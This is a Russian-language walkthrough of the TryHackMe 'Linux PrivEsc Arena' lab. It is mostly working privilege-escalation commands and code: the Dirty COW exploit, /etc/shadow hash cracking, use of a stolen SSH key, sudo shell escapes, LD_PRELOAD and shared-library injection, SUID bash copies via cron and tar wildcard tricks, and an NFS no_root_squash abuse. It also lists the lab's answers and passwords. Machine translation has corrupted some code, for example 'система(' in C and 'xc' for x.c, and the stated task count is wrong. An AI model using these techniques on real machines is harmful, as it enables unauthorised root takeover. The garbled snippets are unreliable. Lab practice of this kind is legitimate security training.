[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux PrivEsc Arena](https://tryhackme.com/r/room/linuxprivescarena) 

Всего 18 заданий:
## Задание 1
Вы можете использовать либо браузерный терминал (который появляется при развертывании машины), либо можете 
подключиться к сети TryHackMe (через OpenVPN) и SSH напрямую.  Если вы этого еще не сделали, сначала пройдите  
комнату OpenVPN и узнайте, как подключиться.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 2
В этой комнате вы научитесь различным тактикам повышения привилегий Linux, включая эксплойты ядра, атаки sudo, атаки 
SUID, атаки с использованием запланированных задач и многое другое.  Эта лаборатория была создана с использованием 
семинара privesc Саги Шахара ( https://github.com/sagishahar/lpeworkshop ) и использовалась как часть курса Udemy по 
повышению привилегий Linux  от Cyber Mentor ( http://udemy.com/course/linux-privilege-escalation-for-beginners ).   

Все инструменты, необходимые для прохождения этого курса, находятся в  папке пользователя  (/home/user/tools).

Давайте сначала подключимся к машине.  SSH открыт на порту 22. Ваши учетные данные:

имя пользователя : TCM
пароль : Hacker123

### Ответьте на вопросы ниже
Разверните машину и войдите в учетную запись пользователя через SSH (или используйте терминал на основе браузера).
```commandline
Ответ не нужен
```

## Задание 3
Обнаружение

Linux- виртуальная машина

1. В командной строке введите:
`/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
2. Из вывода следует, что ОС уязвима для «dirtycow».

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`
2. В командной строке введите: ./c0w

Отказ от ответственности: эта часть займет 1–2 минуты — пожалуйста, дайте ей немного времени на выполнение.

3. В командной строке введите: passwd
4. В командной строке введите: id

Отсюда либо скопируйте `/tmp/passwd` обратно в `/usr/bin/passwd`, либо перезагрузите компьютер, чтобы отменить изменения,
внесенные в двоичный файл passwd.
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 4
Эксплуатация

Linux- виртуальная машина

1. В командной строке введите: `cat /home/user/myvpn.ovpn`
2. В выводе обратите внимание на значение директивы «auth-user-pass».
3. В командной строке введите: `cat /etc/openvpn/auth.txt`
4. Из полученных данных запишите текстовые учетные данные.
5. В командной строке введите: `cat /home/user/.irssi/config | grep -i passw`
6. Из полученных данных запишите текстовые учетные данные.
### Ответьте на вопросы ниже
Какой пароль вы нашли?
```commandline
password321
```
Какие учетные данные пользователя были раскрыты в файле аутентификации OpenVPN?
```commandline
user
```

## Задание 5
Эксплуатация

Linux- виртуальная машина
1. В командной строке введите: `cat ~/.bash_history | grep -i passw`
2. Из полученных данных запишите текстовые учетные данные.
### Ответьте на вопросы ниже
Куда TCM пытался войти?
```commandline
mysql
```
Под каким именем TCM пытался войти в систему?
```commandline
root
```
Непослушный. Какой пароль был обнаружен?
```commandline
password123
```
## Задание 6
Обнаружение

Linux- виртуальная машина

1. В командной строке введите:
`ls -la /etc/shadow`
2. Обратите внимание на права доступа к файлу.

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:  `cat /etc/passwd`
2. Сохраните вывод в файл на машине злоумышленника.
3. В командной строке введите: `cat /etc/shadow`
4.  Сохраните вывод в файл на машине злоумышленника.

Атакующая виртуальная машина

1.  В командной строке введите:  `unshadow <ФАЙЛ-ПАРОЛЬ> <ФАЙЛ-ТЕНИ> > unshadowed.txt`

Теперь у вас есть незатененный файл. Мы уже знаем пароль, но вы можете использовать свой любимый инструмент взлома 
хэшей, чтобы взломать эти хэши. Например:

`hashcat -m 1800 unshadowed.txt rockyou.txt -O`
### Ответьте на вопросы ниже
Каковы были права доступа к файлу /etc/shadow?
```commandline
-rw-rw-r--
```

## Задание 7
Обнаружение

Linux- виртуальная машина

1. В командной строке введите:
`find / -name authorized_keys 2> /dev/null`
2. В командной строке введите:
`find / -name id_rsa 2> /dev/null`
3. Отметьте результаты.

Эксплуатация Linux- виртуальная машина

1. Скопируйте содержимое обнаруженного файла id_rsa в файл на виртуальной машине атакующего .

Атакующая виртуальная машина

1.  В командной строке введите:  `chmod 400 id_rsa`
2.  В командной строке введите: `ssh -i id_rsa root@<ip>`

Теперь у вас должна быть root-оболочка :)
### Ответьте на вопросы ниже
Каков полный путь к обнаруженному вами конфиденциальному файлу?

```commandline
/backups/supersecretkeys/id_rsa
```

## Задание 8
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `sudo -l`
2. В выводе обратите внимание на список программ, которые можно запустить через sudo.

Эксплуатация Linux- виртуальная машина

1. В командной строке введите любую из следующих команд:
а. `sudo find /bin -name nano -exec /bin/sh \;`
б. `sudo awk 'BEGIN {system("/bin/sh")}'`
в. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
г. `sudo vim -c '!sh'`
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 9
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `sudo -l`
2. В выводе обратите внимание на список программ, которые можно запустить через sudo.

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`sudo apache2 -f /etc/shadow`
2. Из выходных данных скопируйте корневой хеш.

Атакующая виртуальная машина

1. Откройте командную строку и введите:
`echo '[Вставленный корневой хэш]' > hash.txt`
2. В командной строке введите:
`jhon --wordlist=/usr/share/wordlists/nmap.lst хэш.txt`
3. В выводе обратите внимание на взломанные учетные данные.
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.

```commandline
Ответ не нужен
```

## Задание 10
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `sudo -l`
2. В выводе обратите внимание, что переменная среды LD_PRELOAD не повреждена.

Эксплуатация

1. Откройте текстовый редактор и введите:
```commandline
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    система("/bin/bash");
}
```
2. Сохраните файл как xc
3. В командной строке введите:
`gcc -fPIC -shared -o /tmp/x.so xc -nostartfiles`
4. В командной строке введите:
`sudo LD_PRELOAD=/tmp/x.so apache2`
5. В командной строке введите: id
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```
## Задание 11
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `find / -type f -perm -04000 -ls 2>/dev/null`
2. В выводе обратите внимание на все двоичные файлы SUID.
3. В командной строке введите:
`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. В выводе обратите внимание, что в доступном для записи каталоге отсутствует файл .so.

Эксплуатация Linux- виртуальная машина

5. В командной строке введите: `mkdir /home/user/.config`
6. В командной строке введите: `cd /home/user/.config`
7. Откройте текстовый редактор и введите:
```commandline
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Сохраните файл как libcalc.c
9. В командной строке введите:
`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. В командной строке введите: `/usr/local/bin/suid-so`
11. В командной строке введите: `id`
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 12
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `dpkg -l | grep nginx`
2. В выводе обратите внимание, что установленная версия nginx ниже 1.6.2-5+deb8u3.

Эксплуатация Linux VM – Терминал 1

1. Для этого эксплойта требуется, чтобы пользователь был www-data. Чтобы сымитировать это, поднимитесь до root, 
   введя: `su root` 
2. Пароль root — password123
3. После повышения до уровня root введите в командной строке: `su -l www-data`
4. В командной строке введите: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. На этом этапе система ожидает выполнения logrotate. Для ускорения процесса это будет смоделировано путем подключения к виртуальной машине Linux через другой терминал.

Linux VM – Терминал 2

1. После входа в систему введите: `su root`
2. Пароль root — password123
3. Как пользователь root, введите следующее: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Вернитесь к предыдущему терминалу.

Linux VM – Терминал 1

1. Из выходных данных следует, что эксплойт продолжил выполнение.
2. В командной строке введите: id
### Ответьте на вопросы ниже
Какая CVE эксплуатируется в этой задаче?
```commandline
CVE-2016-1247
```
Какой двоичный файл поддерживает SUID и участвует в атаке?
```commandline
sudo
```

## Задание 13
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `find / -type f -perm -04000 -ls 2>/dev/null`
2. В выводе обратите внимание на все двоичные файлы SUID.
3. В командной строке введите: `strings /usr/local/bin/suid-env`
4. В выходных данных обратите внимание на функции, используемые двоичным файлом.

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. В командной строке введите: `gcc /tmp/service.c -o /tmp/service`
3. В командной строке введите: `export PATH=/tmp:$PATH`
4. В командной строке введите: `/usr/local/bin/suid-env`
5. В командной строке введите: `id`
### Ответьте на вопросы ниже
Какова последняя строка вывода «`strings /usr/local/bin/suid-env`» ?
```commandline
service apache2 start
```

## Задание 14
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `find / -type f -perm -04000 -ls 2>/dev/null`
2. В выводе обратите внимание на все двоичные файлы SUID.
3. В командной строке введите: `strings /usr/local/bin/suid-env2`
4. В выходных данных обратите внимание на функции, используемые двоичным файлом.

Метод эксплуатации №1 Linux- виртуальная машина

1. В командной строке введите:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
2. В командной строке введите:
export -f /usr/sbin/service
3. В командной строке введите: `/usr/local/bin/suid-env2`

Метод эксплуатации №2 Linux- виртуальная машина

1. В командной строке введите:
`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`
### Ответьте на вопросы ниже
Какова последняя строка вывода « strings /usr/local/bin/suid-env2»  ?
```commandline
/usr/sbin/service apache2 start
```

## Задание 15
Обнаружение

Linux- виртуальная машина

1. В командной строке введите:  `getcap -r / 2>/dev/null`
2. В выводе обратите внимание на значение возможности «cap_setuid».

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Наслаждайтесь root-правами!
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.

```commandline
Ответ не нужен
```
## Задание 16
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `cat /etc/crontab`
2. В выводе обратите внимание на значение переменной «PATH».
Эксплуатация Linux- виртуальная машина
1. В командной строке введите:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. В командной строке введите: `chmod +x /home/user/overwrite.sh`
3. Подождите 1 минуту, пока скрипт Bash выполнится.
4. В командной строке введите: `/tmp/bash -p`
5. В командной строке введите: `id`
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 17
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `cat /etc/crontab`
2. В выводе обратите внимание на скрипт «`/usr/local/bin/compress.sh`»
3. В командной строке введите: `cat /usr/local/bin/compress.sh`
4. В выводе обратите внимание на подстановочный знак (*), используемый «tar».

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. нажмите `/home/user/--checkpoint=1`
3. нажмите `/home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Подождите 1 минуту, пока скрипт Bash выполнится.
5. В командной строке введите: `/tmp/bash -p`
6. В командной строке введите: `id`
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 18
Обнаружение

Linux- виртуальная машина

1. В командной строке введите: `cat /etc/crontab`
2. В выводе обратите внимание на скрипт «overwrite.sh»
3. В командной строке введите: `ls -l /usr/local/bin/overwrite.sh`
4. В выводе обратите внимание на права доступа к файлам.

Эксплуатация Linux- виртуальная машина

1. В командной строке введите:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Подождите 1 минуту, пока скрипт Bash выполнится.
3. В командной строке введите: `/tmp/bash -p`
4. В командной строке введите: id
### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 19
Обнаружение

Linux- виртуальная машина

1. В командной строке введите:  `cat /etc/exports`
2. В выводе обратите внимание, что для экспорта «/tmp» определена опция «no_root_squash».

Эксплуатация Атакующая виртуальная машина

1. Откройте командную строку и введите:  `showmount -e MACHINE_IP`
2. В командной строке введите: `mkdir /tmp/1`
3. В командной строке введите: `mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1`
В командной строке введите:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/xc`
4. В командной строке введите: `gcc /tmp/1/xc -o /tmp/1/x`
5. В командной строке введите: `chmod +s /tmp/1/x`

Linux- виртуальная машина

1. В командной строке введите: `/tmp/x`
2. В командной строке введите: id
Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)